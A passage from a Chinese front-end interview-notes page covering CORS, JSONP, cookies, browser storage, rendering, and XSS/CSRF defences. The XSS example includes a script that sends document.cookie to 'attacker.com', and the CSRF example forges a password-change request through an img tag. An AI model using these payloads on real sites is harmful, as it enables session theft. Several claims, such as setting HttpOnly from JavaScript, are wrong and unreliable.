href="#CORS有时候会发一个option请求，有了解过吗？" class="headerlink" title="CORS有时候会发一个option请求，有了解过吗？"></a>CORS有时候会发一个option请求，有了解过吗？</h5><p>是的，CORS（跨源资源共享）机制在某些情况下会发送一个OPTIONS请求，这个请求通常被称为”预检请求”（Preflight Request）。预检请求的目的是允许浏览器在实际发起跨域请求之前，向目标服务器发送一个OPTIONS请求，以获取关于服务器是否支持跨域请求的信息，以及请求所使用的 HTTP 方法是否被允许。</p><p>以下是一些常见情况下浏览器会发送预检请求的情况：</p><ol><li><p><strong>跨域AJAX请求：</strong> 当使用XMLHttpRequest或Fetch API等方式发起跨域AJAX请求时，浏览器会先发送一个OPTIONS请求，检查服务器是否支持跨域请求。</p></li><li><p><strong>带有自定义头信息的请求：</strong> 如果请求中包含自定义的HTTP头信息（如<code>Authorization</code>头用于身份验证），浏览器也会发送预检请求。</p></li><li><p><strong>使用非简单HTTP方法：</strong> 如果请求使用的HTTP方法不是简单请求（例如GET、POST、HEAD），而是诸如PUT、DELETE、OPTIONS等复杂请求方法，浏览器也会发送预检请求。</p></li></ol><p>预检请求的响应中包含了CORS相关的头信息，如<code>Access-Control-Allow-Origin</code>、<code>Access-Control-Allow-Methods</code>、<code>Access-Control-Allow-Headers</code>等，这些头信息告诉浏览器是否允许实际的跨域请求以及使用哪些方法和头信息。只有在预检请求的响应中包含了合适的CORS头信息，并且服务器确认支持跨域请求，浏览器才会继续发送实际的跨域请求。</p><p>以下是一个典型的预检请求的示例：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/api/resource</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://example.org<br><span class="hljs-attribute">Access-Control-Request-Method</span><span class="hljs-punctuation">: </span>POST<br><span class="hljs-attribute">Access-Control-Request-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure><p>服务器接收到预检请求后，需要返回一个包含CORS头信息的响应，例如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>http://example.org<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>POST<br><span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure><p>这样浏览器才会继续发送实际的跨域请求。预检请求的目的是增加安全性，确保服务器明确允许了跨域请求，从而减少潜在的安全风险。</p><h5 id="跨域检测过程"><a href="#跨域检测过程" class="headerlink" title="跨域检测过程"></a>跨域检测过程</h5><p>跨域检测（Cross-Origin Detection）是浏览器的一项安全特性，用于检测和限制跨源请求，以防止恶意网站访问其他源的敏感数据。跨域检测的主要过程包括以下几个步骤：</p><ol><li><p><strong>发起跨域请求：</strong> 当浏览器中的一个网页（源A）尝试向不同源的服务器（源B）发送HTTP请求时，浏览器会首先发起该请求。</p></li><li><p><strong>预检请求（对于CORS）：</strong> 如果请求是一种需要预检的跨域请求（例如带有自定义头部的请求或使用HTTP方法如PUT、DELETE等的请求），浏览器会首先发送一个OPTIONS请求，这个请求被称为”预检请求”（preflight request）。预检请求的目的是询问服务器是否允许实际请求的跨域访问。</p></li><li><p><strong>服务器响应（对于CORS）：</strong> 服务器接收到预检请求后，会检查请求头中的”Origin”字段，然后决定是否允许该跨域请求。如果服务器允许跨域访问，它会在响应中包含一些特定的CORS头部，如”Access-Control-Allow-Origin”，来告知浏览器该请求是被允许的。</p></li><li><p><strong>浏览器处理响应：</strong> 浏览器会检查服务器的响应，如果发现响应头中包含了必要的CORS头部并且源A被允许访问源B，浏览器将允许实际请求（例如GET、POST等）继续。如果服务器未返回必要的头部或者不允许跨域访问，浏览器会阻止实际请求，从而保护源B的数据。</p></li><li><p><strong>获取响应数据（对于实际请求）：</strong> 如果实际请求被允许，浏览器会向源B发送实际请求，并获取响应数据。这个过程是允许跨域请求的最终阶段。</p></li></ol><p>需要注意的是，跨域检测只是浏览器层面的限制，它不适用于服务器之间的通信。服务器之间的跨域请求是可能的，但需要在服务器端进行配置，以允许或拒绝跨域请求。</p><p>此外，对于不同的跨域请求方式（例如JSONP、CORS、代理等），跨域检测的过程会有所不同。CORS是目前最常用的跨域解决方案之一，它提供了更灵活的方式来控制跨域请求。</p><h5 id="为什么JSONP可以跨域"><a href="#为什么JSONP可以跨域" class="headerlink" title="为什么JSONP可以跨域"></a>为什么JSONP可以跨域</h5><p>JSONP（JSON with Padding）可以跨域的原因是因为它利用了浏览器对<code>&lt;script&gt;</code>标签的加载行为的一种特性，而不受同源策略的限制。以下是JSONP可以跨域的关键原因：</p><ol><li><p><strong>加载外部脚本不受同源策略限制：</strong> 浏览器允许通过<code>&lt;script&gt;</code>标签加载来自不同域的脚本文件。这是由于同源策略的一个例外规则，浏览器允许加载外部脚本，而不会阻止跨域请求。</p></li><li><p><strong>动态创建<code>&lt;script&gt;</code>标签：</strong> JSONP利用了动态创建<code>&lt;script&gt;</code>标签的方式来请求跨域数据。客户端（浏览器）通过创建一个<code>&lt;script&gt;</code>标签，并将目标服务器的URL作为<code>src</code>属性的值，从而发起跨域请求。浏览器会将这个标签加载为一个外部脚本，而不会对其进行同源策略检查。</p></li><li><p><strong>回调函数：</strong> JSONP要求客户端在请求中指定一个回调函数的名称，并将这个回调函数名称作为查询参数包含在URL中。目标服务器在响应中使用这个回调函数来包装数据，以便客户端可以在响应到达后执行该函数。这是JSONP的关键部分，通过回调函数，客户端可以获取并处理来自不同域的数据。</p></li></ol><p>需要注意的是，JSONP存在一些潜在的安全风险，因为它要求服务器信任客户端提供的回调函数名称，并且客户端需要谨慎处理从跨域服务器返回的数据，以防止安全漏洞。因此，在使用JSONP时，请确保只与受信任的服务器交互，并避免在URL中包含敏感信息。在现代Web开发中，推荐使用更安全和灵活的跨域解决方案，如CORS（跨域资源共享）或代理服务器。</p><h3 id="2、浏览器本地存储"><a href="#2、浏览器本地存储" class="headerlink" title="2、浏览器本地存储"></a>2、浏览器本地存储</h3><p>在 JavaScript 中，有几种本地存储的方式，每种方式都有其特点和用途，以下是常见的本地存储方式以及它们的区别：</p><ol><li><p><strong>Cookies（Cookie）：</strong></p><ul><li>Cookies 是最早的本地存储机制之一，可以通过 <code>document.cookie</code> 属性进行读写。</li><li>Cookies 的特点是可以存储小量数据（通常不超过 4KB），并且可以设置过期时间。</li><li>Cookies 在每个 HTTP 请求中都会被发送到服务器，可能会影响性能。</li></ul></li><li><p><strong>Web Storage（Web 存储）：</strong></p><ul><li>Web Storage 包括 <code>localStorage</code> 和 <code>sessionStorage</code> 两种机制。</li><li><code>localStorage</code>：用于长期存储数据，数据在不同页面和浏览器会话中保持不变。它可以存储大约 5MB 的数据。最大为10M字节空间。</li><li><code>sessionStorage</code>：用于会话级别的存储，数据在当前会话结束后会被清除。它也可以存储大约 5MB 的数据。</li><li>Web Storage 是键值对的存储方式，数据以字符串形式存储，不支持复杂数据类型。</li></ul></li><li><p><strong>IndexedDB：</strong></p><ul><li>IndexedDB 是一个更强大的本地数据库，用于存储大量结构化数据。它支持事务、索引、查询等高级功能。</li><li>IndexedDB 具有较高的容量限制，通常可以存储数百兆到几个GB的数据。</li><li>与 Web Storage 不同，IndexedDB 支持存储复杂的 JavaScript 对象，而不仅仅是字符串。</li></ul></li><li><p><strong>Cache API：</strong></p><ul><li>Cache API 用于存储缓存的响应数据，通常用于提高 Web 应用的性能。</li><li>Cache API 可以存储响应对象、图片、样式表等资源，允许开发者灵活地控制缓存的策略。</li><li>它通常与 Service Worker 结合使用，以实现离线访问和更高级的缓存管理。</li></ul></li><li><p><strong>File API：</strong></p><ul><li>File API 允许 Web 应用访问用户文件系统，以读写文件。虽然它通常不用于存储数据，但可以用于上传和下载文件。</li></ul></li></ol><p>区别总结：</p><ul><li>Cookies 适用于小数据存储，但会在每个 HTTP 请求中发送到服务器。</li><li>Web Storage 提供了简单的键值对存储，适用于较大量的数据。</li><li>IndexedDB 适用于大规模结构化数据存储，支持高级查询和事务。</li><li>Cache API 用于缓存响应数据以提高性能。</li><li>File API 用于处理用户文件系统中的文件。</li></ul><p>选择哪种本地存储方式取决于具体的需求和数据规模。对于简单的键值对存储，Web Storage 是一个不错的选择。如果需要高级数据库功能和大规模数据存储，可以考虑使用 IndexedDB。如果需要缓存网络请求或资源，可以使用 Cache API。</p><h5 id="Cookie能设置什么"><a href="#Cookie能设置什么" class="headerlink" title="Cookie能设置什么"></a>Cookie能设置什么</h5><p>Cookie 是一种在客户端（通常是浏览器）存储数据的小型文本文件。它可以用于在客户端和服务器之间传递和存储有关用户的信息。Cookie 可以包含多种信息，但需要注意的是，由于其大小和安全性限制，通常不适合存储大量敏感数据。</p><p>以下是可以在 Cookie 中设置的信息：</p><ol><li><p><strong>键值对数据：</strong> Cookie 最基本的用法是存储键值对数据，可以是任何文本数据。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;username=John&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;favoriteColor=blue&quot;</span>;<br></code></pre></td></tr></table></figure><p>上述代码创建了两个 Cookie，分别存储了用户名和喜欢的颜色。</p></li><li><p><strong>过期时间：</strong> 可以设置 Cookie 的过期时间，使其在指定时间后失效。过期时间可以是一个具体的日期和时间，也可以是相对于当前时间的秒数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 设置 Cookie 在一小时后过期</span><br><span class="hljs-keyword">const</span> expirationDate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>expirationDate.<span class="hljs-title function_">setHours</span>(expirationDate.<span class="hljs-title function_">getHours</span>() + <span class="hljs-number">1</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`sessionToken=abc123; expires=<span class="hljs-subst">$&#123;expirationDate.toUTCString()&#125;</span>`</span>;<br><br><span class="hljs-comment">// 或者使用相对时间</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;userId=123; max-age=3600&quot;</span>; <span class="hljs-comment">// 3600秒后过期</span><br></code></pre></td></tr></table></figure></li><li><p><strong>路径和域名限制：</strong> 可以指定 Cookie 的可访问路径和域名，以控制哪些页面可以访问 Cookie。这有助于增强安全性和隐私。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 限制 Cookie 只能在当前路径下访问</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;sessionId=abc; path=/secure&quot;</span>;<br><br><span class="hljs-comment">// 限制 Cookie 只能在指定域名下访问</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;authToken=xyz; domain=example.com&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>安全标志：</strong> 通过设置安全标志，可以确保 Cookie 只在安全的 HTTPS 连接下传输。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;secureCookie=123; secure&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>HttpOnly标志：</strong> 通过设置 HttpOnly 标志，可以防止 JavaScript 代码访问 Cookie，从而增加安全性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;sessionToken=xyz; HttpOnly&quot;</span>;<br></code></pre></td></tr></table></figure></li></ol><p>需要注意的是，虽然 Cookie 是一种方便的客户端存储机制，但它们也有一些限制，包括大小限制、浏览器数量限制以及对隐私的一些风险。因此，在使用 Cookie 存储敏感信息时，务必谨慎，并考虑其他安全性更高的存储选项，如使用浏览器的 Web Storage API 或将敏感数据存储在服务器端。</p><h5 id="cookie一般存什么"><a href="#cookie一般存什么" class="headerlink" title="cookie一般存什么"></a>cookie一般存什么</h5><p>Cookie 是一种在客户端（浏览器）和服务器之间传递的小型文本文件，它可以存储在用户的计算机上。Cookie 主要有以下作用：</p><ol><li><p><strong>跟踪用户会话：</strong> Cookie 可以用于跟踪用户的会话状态，以识别用户并在不同页面之间保持一致的状态。例如，用户登录后，服务器可以创建一个包含用户标识的 Cookie，以便在用户访问其他页面时识别该用户。</p></li><li><p><strong>存储用户偏好设置：</strong> 通过 Cookie，网站可以存储用户的偏好设置，如语言选择、主题、字体大小等，以提供个性化的用户体验。</p></li><li><p><strong>购物车和电子商务：</strong> 在电子商务网站中，Cookie 可以用于存储用户的购物车内容，使用户可以在多个页面之间保持购物车状态。</p></li><li><p><strong>记住登录状态：</strong> Cookie 常用于记住用户的登录状态，以便用户在下次访问时自动登录。</p></li><li><p><strong>广告和跟踪分析：</strong> Cookie 可以用于广告跟踪和分析用户行为，以便向用户显示相关广告和收集网站使用数据。</p></li><li><p><strong>防止 CSRF 攻击：</strong> 在某些情况下，Cookie 可以用于增强网站的安全性，防止跨站请求伪造（CSRF）攻击。</p></li><li><p><strong>存储临时数据：</strong> Cookie 还可以用于存储一些临时数据，如临时会话标识或页面浏览历史。</p></li></ol><p>一般来说，Cookie 存储的信息应该是敏感度较低的数据，因为 Cookie 存储在用户的计算机上，用户有能力查看和修改 Cookie。对于敏感信息（如密码或信用卡号），通常不应该存储在 Cookie 中，而应该使用其他更安全的方式，如使用服务器端会话来管理用户状态。</p><p>总之，Cookie 是一种有用的工具，用于在客户端和服务器之间传递信息和维护状态，但在使用时需要谨慎处理敏感数据和用户隐私。</p><h5 id="cookie存密码怎么保证安全"><a href="#cookie存密码怎么保证安全" class="headerlink" title="cookie存密码怎么保证安全"></a>cookie存密码怎么保证安全</h5><p>将密码存储在 Cookie 中是不安全的做法，因为 Cookie 存储在用户的计算机上，用户有能力查看和修改 Cookie 数据。如果密码泄漏或被盗，将会对用户的安全造成严重威胁。因此，密码存储应该采用更加安全的方式。以下是一些提高密码存储安全性的方法：</p><ol><li><p><strong>不要明文存储密码：</strong> 绝不要将用户密码明文存储在 Cookie 中或任何客户端存储中。明文密码的泄漏会对用户的安全构成直接威胁。</p></li><li><p><strong>使用加密存储：</strong> 应该对密码进行适当的加密，然后将加密后的密码存储在 Cookie 中。加密算法应该是安全的且不容易破解的。</p></li><li><p><strong>使用会话令牌：</strong> 可以考虑使用会话令牌（Session Token）而不是密码存储在 Cookie 中。用户登录成功后，分配一个唯一的会话令牌，并将该令牌存储在 Cookie 中。服务器使用令牌来验证用户身份，而不是存储密码。</p></li><li><p><strong>设置安全标志：</strong> 使用 Cookie 属性中的 <code>HttpOnly</code> 和 <code>Secure</code> 标志来提高安全性。<code>HttpOnly</code> 标志可以防止 JavaScript 访问 Cookie，从而防止可能的 XSS 攻击。<code>Secure</code> 标志要求 Cookie 只在加密的 HTTPS 连接中传输。</p></li><li><p><strong>使用单点登录（Single Sign-On，SSO）：</strong> 对于多个相关应用的情况，可以考虑使用单点登录系统，用户只需要在一次登录后获得令牌，然后可以在多个应用之间共享登录状态，而无需存储密码在 Cookie 中。</p></li><li><p><strong>定期更改密码：</strong> 如果确实需要将密码存储在 Cookie 中，应该定期要求用户更改密码，并更新 Cookie 中的密码。</p></li><li><p><strong>限制 Cookie 的生命周期：</strong> 将存储密码的 Cookie 设置为短期有效，以减小泄漏的风险。</p></li></ol><p>总之，密码存储是一个敏感的问题，应该采取一系列安全措施来降低风险。最佳的做法是避免将密码存储在客户端，而是在服务器端进行身份验证和密码管理。对于客户端存储，应该采用会话令牌或其他替代方案来提高安全性。</p><h3 id="3、浏览器如何渲染数据"><a href="#3、浏览器如何渲染数据" class="headerlink" title="3、浏览器如何渲染数据"></a>3、浏览器如何渲染数据</h3><p>浏览器渲染数据的过程是一个复杂的流程，涉及多个步骤和组件。以下是浏览器渲染数据的主要步骤：</p><ol><li><p><strong>解析 HTML 和构建 DOM 树：</strong> 浏览器首先将接收到的 HTML 文档解析为 DOM（文档对象模型）树。DOM 树是一个表示页面结构和内容的树状结构，每个 HTML 元素都对应一个 DOM 节点。</p></li><li><p><strong>解析 CSS 和构建 CSSOM 树：</strong> 浏览器解析样式表（通常是外部 CSS 文件和内嵌样式）并构建 CSSOM（CSS 对象模型）树。CSSOM 树表示了页面的样式信息，包括每个元素的样式规则和计算后的样式值。</p></li><li><p><strong>合并 DOM 和 CSSOM，构建渲染树（Render Tree）：</strong> 浏览器将 DOM 树和 CSSOM 树合并，构建出渲染树。渲染树包含了需要渲染的可见元素，但不包括对页面布局无影响的元素，如 <code>display: none</code> 的元素。</p></li><li><p><strong>计算布局（Layout）：</strong> 渲染树中的每个元素都会根据其样式信息计算其在页面上的位置和大小。这个过程被称为布局或回流（reflow）。</p></li><li><p><strong>绘制（Paint）：</strong> 浏览器根据计算得到的布局信息开始绘制页面。这包括绘制元素的背景、边框、文本和其他内容。</p></li><li><p><strong>合成（Composite）：</strong> 浏览器将页面上的各个图层按正确的顺序合成到最终的页面画布上。这个过程通常由 GPU（图形处理单元）执行，以提高性能和平滑动画。</p></li><li><p><strong>显示（Display）：</strong> 最终的渲染结果被显示在用户的屏幕上。</p></li></ol><p>需要注意的是，浏览器通常会对上述步骤进行优化，例如使用异步加载和渲染，以提高页面加载和响应性能。此外，当页面中的数据发生变化或用户与页面进行交互时，浏览器会重新执行部分或全部的渲染流程，以确保页面保持最新的状态。</p><p>总之，浏览器渲染数据是一个复杂的多阶段过程，涉及 HTML、CSS、DOM、样式计算、布局、绘制、合成等多个组件和步骤，最终将页面内容呈现给用户。了解这个过程有助于优化页面性能和理解前端开发中的渲染问题。</p><h3 id="4、重排，重绘？什么操作会触发"><a href="#4、重排，重绘？什么操作会触发" class="headerlink" title="4、重排，重绘？什么操作会触发"></a>4、重排，重绘？什么操作会触发</h3><p>在浏览器渲染页面时，有两个重要的概念：重排（Reflow）和重绘（Repaint）。它们分别表示在不同情况下浏览器会重新计算元素的布局和重新绘制元素的样式，具体如下：</p><ol><li><p><strong>重排（Reflow）：</strong> 也称为回流，是指浏览器重新计算元素的大小和位置，并重新构建页面的布局。重排通常是由以下操作触发的：</p><ul><li>添加、删除、修改 DOM 元素。</li><li>改变窗口大小。</li><li>修改元素的位置、大小、内容或样式。</li><li>修改字体大小。</li><li>获取某些属性（如 offsetWidth、offsetHeight、clientWidth、clientHeight 等）。</li></ul><p>重排是非常昂贵的操作，因为它会导致整个页面重新布局，可能涉及多次布局计算，对性能影响较大。</p></li><li><p><strong>重绘（Repaint）：</strong> 是指浏览器重新绘制元素的可视部分，但不会改变元素的布局。重绘通常是由以下操作触发的：</p><ul><li>修改元素的背景色、颜色、边框等样式属性。</li><li>添加或移除 CSS 类。</li><li>修改元素的 opacity（透明度）。</li></ul><p>重绘相对于重排来说开销较小，因为它只涉及样式的变化，不需要重新计算布局。</p></li></ol><p>触发重排和重绘会导致浏览器重新计算并重新绘制页面，因此应尽量减少这些操作的频率，以提高页面性能。一种优化策略是将多次的 DOM 操作合并成一次，或者使用 CSS 动画来避免频繁的重排和重绘。</p><p>此外，现代浏览器还提供了一些工具来帮助开发者识别和优化重排和重绘的问题，例如浏览器的开发者工具可以显示这些操作的发生情况，帮助你定位性能瓶颈。</p><h3 id="5、浏览器安全：xss-x2F-csrf"><a href="#5、浏览器安全：xss-x2F-csrf" class="headerlink" title="5、浏览器安全：xss&#x2F;csrf"></a>5、浏览器安全：xss&#x2F;csrf</h3><p>浏览器安全是 Web 开发中非常重要的一部分，涉及到多个方面，包括 XSS（跨站脚本攻击）、CSRF（跨站请求伪造）以及跨域安全措施。以下是这些安全问题的简要介绍和防范措施：</p><h5 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h5><p>XSS（Cross-Site Scripting）跨站脚本攻击是一种常见的网络安全漏洞，攻击者通过注入恶意脚本代码到受信任网站的输入字段，然后使其他用户在浏览该网站时执行这些恶意脚本。XSS 攻击可以导致盗取用户信息、会话劫持、恶意操作用户账户等危险后果。</p><p>以下是关于 XSS 攻击的详细说明：</p><ol><li><p><strong>攻击原理</strong>：</p><p>XSS 攻击利用了网站未充分过滤或转义用户输入的漏洞。攻击者向受信任网站的输入字段（如搜索框、评论框、用户注册表单等）注入包含恶意 JavaScript 代码的输入。当其他用户访问包含这些恶意输入的页面时，他们的浏览器会执行注入的 JavaScript 代码，从而使攻击者能够执行恶意操作。</p></li><li><p><strong>攻击示例</strong>：</p><p>假设一个论坛网站允许用户在评论中输入文本，并且未对输入进行充分验证和过滤。攻击者可以在评论中注入如下恶意代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://attacker.com/steal-cookie?cookie=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当其他用户浏览这个评论时，他们的浏览器会执行上述代码，将他们的 Cookie 数据发送到攻击者的服务器，攻击者可以利用这些信息来伪装成受害者，执行恶意操作。</p></li><li><p><strong>XSS 攻击类型</strong>：</p><ul><li><p><strong>存储型 XSS</strong>：攻击者将恶意脚本存储在服务器上，当其他用户访问包含恶意脚本的页面时，恶意代码会从服务器加载并执行。</p></li><li><p><strong>反射型 XSS</strong>：攻击者将恶意脚本注入到 URL 中，受害者点击包含恶意 URL 的链接时，恶意代码会从 URL 中执行。</p></li><li><p><strong>DOM-based XSS</strong>：攻击者注入恶意脚本，脚本会直接修改页面的 DOM 结构，而不涉及服务器端，攻击通常发生在客户端。</p></li></ul></li><li><p><strong>预防措施</strong>：</p><p>针对 XSS 攻击，可以采取以下预防措施：</p><ul><li><p><strong>输入验证</strong>：对用户输入数据进行验证，确保只接受预期的合法输入。</p></li><li><p><strong>转义输出</strong>：在将用户输入数据嵌入到 HTML、JavaScript 或其他上下文中之前，将其进行转义，以防止恶意代码的执行。常见的转义方法包括使用 HTML 实体编码、JavaScript 的 <code>encodeURIComponent</code> 等。</p></li><li><p><strong>HTTP 头部安全策略</strong>：使用 Content Security Policy（CSP）等 HTTP 头部安全策略，限制哪些内容可以加载和执行。</p></li><li><p><strong>使用框架和模板引擎</strong>：使用现代的 Web 框架和模板引擎，它们通常会自动处理输入验证和输出转义。</p></li><li><p><strong>不信任用户输入</strong>：将用户输入视为不可信，不要直接执行或渲染用户输入的内容。</p></li><li><p><strong>更新和维护</strong>：定期更新和维护应用程序，修复已知的漏洞和安全问题。</p></li></ul></li></ol><p>XSS 攻击是一个严重的安全问题，但通过合适的预防措施和最佳实践，可以有效地减轻其风险。开发者需要保持警惕，对用户输入数据进行充分的验证和转义，以确保应用程序的安全性。</p><h5 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h5><p>CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种常见的网络安全攻击，攻击者通过伪装用户的身份，以用户的名义在受害者不知情的情况下执行操作。这种攻击可以导致未经授权的操作，例如更改密码、发送恶意请求等，从而损害用户的账户或数据。</p><p>以下是关于 CSRF 攻击的详细说明：</p><ol><li><p><strong>攻击原理</strong>：</p><p>CSRF 攻击利用了用户在访问网站时的身份验证信息（如 Cookie 或会话令牌）。攻击者诱使受害者在已经登录了某个受信任的网站 A 的情况下，访问恶意网站 B。网站 B 中的恶意代码会发起针对网站 A 的请求，利用了受害者在网站 A 中的身份验证凭证，从而执行某些操作，而受害者不自知。</p></li><li><p><strong>攻击示例</strong>：</p><p>假设网站 A 允许用户通过访问链接 <code>/change-password?new-password=attacker_password</code> 来更改密码。攻击者可以构造一个网站 B，在网站 B 中包含如下 HTML 代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://websiteA.com/change-password?new-password=attacker_password&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Harmless Image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当受害者访问网站 B 时，浏览器会加载这个图片，实际上是执行了对网站 A 的密码修改请求。</p></li><li><p><strong>预防措施</strong>：</p><p>针对 CSRF 攻击，可以采取以下预防措施：</p><ul><li><p><strong>同源策略</strong>：浏览器的同源策略限制了网页只能发起同源（同协议、同域名、同端口）的请求，这有助于防止跨站点请求伪造。</p></li><li><p><strong>CSRF Token</strong>：在每个请求中包含一个 CSRF Token，这个 Token 由服务器生成并与用户会话相关联。在执行敏感操作之前，服务器会验证请求中的 CSRF Token 是否与用户会话中的 Token 匹配。攻击者无法获取受害者的有效 CSRF Token，因此无法伪造有效请求。</p></li><li><p><strong>SameSite Cookie 属性</strong>：将 Cookie 的 <code>SameSite</code> 属性设置为 <code>Strict</code> 或 <code>Lax</code> 可以限制跨站点请求伪造。这样可以防止第三方网站通过 <code>&lt;img&gt;</code>、<code>&lt;script&gt;</code> 等标签伪造请求。</p></li><li><p><strong>Referer 检查</strong>：服务器可以检查请求的 Referer 头部，确保请求来自合法的来源。但这种方法不是百分之百可靠，因为有些浏览器可能会禁用 Referer。</p></li><li><p><strong>双重确认</strong>：对于执行敏感操作的请求，可以要求用户进行二次确认，以确保用户的意愿。</p></li><li><p><strong>限制敏感操作的 HTTP 方法</strong>：将敏感操作限制为 POST、PUT、DELETE 等需要请求主体的 HTTP 方法，而不是容易伪造的 GET。</p></li></ul></li></ol><p>CSRF 攻击是一个常见的网络安全问题，但通过采取适当的预防措施，可以有效减少其风险。在开发中，务必考虑和测试应用程序的安全性，以保护用户的数据和账户。</p><h5 id="csrf防范的token需要用什么信息生成"><a href="#csrf防范的token需要用什么信息生成" class="headerlink" title="csrf防范的token需要用什么信息生成"></a>csrf防范的token需要用什么信息生成</h5><p>CSRF（Cross-Site Request Forgery）攻击防范的Token通常称为CSRF Token或Anti-CSRF Token，它需要包含以下信息以有效地防止CSRF攻击：</p><ol><li><p><strong>随机数或加密信息：</strong> CSRF Token应该包含随机生成的数值或者加密信息，确保每个Token都是唯一的。这个信息可以是随机数、随机字符串、会话密钥等。这样可以防止攻击者猜测或预测Token的值。</p></li><li><p><strong>用户标识信息：</strong> Token通常需要包含关联到用户的标识信息，以确保Token只能由合法用户使用。这可以是用户的ID、用户名、邮箱等信息。</p></li><li><p><strong>时间戳或过期时间：</strong> 为了增加Token的安全性，可以将时间戳或过期时间包含在Token中。这可以确保Token在一定时间后失效，即使攻击者获取了Token，也无法长期滥用。</p></li><li><p><strong>其他安全性信息：</strong> 可以根据具体需求包含其他安全性信息，如来源网址、HTTP Referer 头信息等，以进一步增强Token的安全性。</p></li></ol><p>一旦生成了包含这些信息的CSRF Token，它可以被嵌入到Web表单或HTTP请求头中，然后在服务器端进行验证。服务器在接收到请求时，会检查请求中的Token是否与用户的标识信息和过期时间等匹配，如果匹配则认为请求是合法的，否则会拒绝请求，从而有效地防止CSRF攻击。</p><p>需要注意的是，CSRF Token的生成和验证是应用程序开发者的责任，开发者需要确保Token的安全性和合理性，以有效地保护应用程序免受CSRF攻击的威胁。常见的Web开发框架和库通常提供了一些工具和机制来简化CSRF Token的生成和验证过程。</p><h3 id="6、浏览器的线程与进程"><a href="#6、浏览器的线程与进程" class="headerlink" title="6、浏览器的线程与进程"></a>6、浏览器的线程与进程</h3><blockquote><p>写的很好的文章：<a href="https://juejin.cn/post/7064499913115041806">https://juejin.cn/post/7064499913115041806</a></p></blockquote><p>浏览器的进程和线程是浏览器实现其功能的基础。它们之间的关系和任务分工对于理解浏览器的运行原理和性能优化至关重要。简单来说，进程是操作系统资源分配的最小单位，而线程是操作系统调度（CPU 利用率）的最小单位。</p><p>进程和线程之间的关系有以下 4 